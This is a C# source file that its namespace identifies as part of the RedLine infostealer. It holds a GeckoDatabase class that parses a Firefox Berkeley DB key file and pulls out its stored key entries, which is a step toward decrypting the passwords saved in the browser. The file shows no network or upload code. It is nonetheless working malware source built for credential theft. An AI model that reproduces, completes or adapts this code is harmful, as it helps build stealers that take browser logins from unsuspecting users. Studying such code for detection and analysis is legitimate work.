using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace RedLine.Logic.Browsers.Gecko
{
  public class GeckoDatabase
  {
    public string Version { get; set; }

    public List<KeyValuePair<string, string>> Keys { get; }

    public GeckoDatabase(string FileName)
    {
      List<byte> byteList = new List<byte>();
      this.Keys = new List<KeyValuePair<string, string>>();
      using (BinaryReader binaryReader = new BinaryReader((Stream) File.OpenRead(FileName)))
      {
        int num = 0;
        for (int length = (int) binaryReader.BaseStream.Length; num < length; ++num)
          byteList.Add(binaryReader.ReadByte());
      }
      string str1 = BitConverter.ToString(this.Calculate(byteList.ToArray(), 0, 4, false)).Replace("-", "");
      string str2 = BitConverter.ToString(this.Calculate(byteList.ToArray(), 4, 4, false)).Replace("-", "");
      int int32 = BitConverter.ToInt32(this.Calculate(byteList.ToArray(), 12, 4, true), 0);
      if (!string.IsNullOrEmpty(str1))
      {
        this.Version = "Berkelet DB";
        if (str2.Equals("00000002"))
          this.Version += " 1.85 (Hash, version 2, native byte-order)";
        int num1 = int.Parse(BitConverter.ToString(this.Calculate(byteList.ToArray(), 56, 4, false)).Replace("-", ""));
        int num2 = 1;
        while (this.Keys.Count < num1)
        {
          string[] array = new string[(num1 - this.Keys.Count) * 2];
          for (int index = 0; index < (num1 - this.Keys.Count) * 2; ++index)
            array[index] = BitConverter.ToString(this.Calculate(byteList.ToArray(), int32 * num2 + 2 + index * 2, 2, true)).Replace("-", "");
          Array.Sort<string>(array);
          for (int index = 0; index < array.Length; index += 2)
          {
            int start1 = Convert.ToInt32(array[index], 16) + int32 * num2;
            int start2 = Convert.ToInt32(array[index + 1], 16) + int32 * num2;
            int num3 = index + 2 >= array.Length ? int32 + int32 * num2 : Convert.ToInt32(array[index + 2], 16) + int32 * num2;
            string key = Encoding.ASCII.GetString(this.Calculate(byteList.ToArray(), start2, num3 - start2, false));
            string str3 = BitConverter.ToString(this.Calculate(byteList.ToArray(), start1, start2 - start1, false));
            if (!string.IsNullOrEmpty(key))
              this.Keys.Add(new KeyValuePair<string, string>(key, str3));
          }
          ++num2;
        }
      }
      else
        this.Version = "Unknow database format";
    }

    private byte[] Calculate(byte[] source, int start, int length, bool littleEndian)
    {
      byte[] numArray = new byte[length];
      int index1 = 0;
      for (int index2 = start; index2 < start + length; ++index2)
      {
        numArray[index1] = source[index2];
        ++index1;
      }
      if (littleEndian)
        Array.Reverse((Array) numArray);
      return numArray;
    }
  }
}
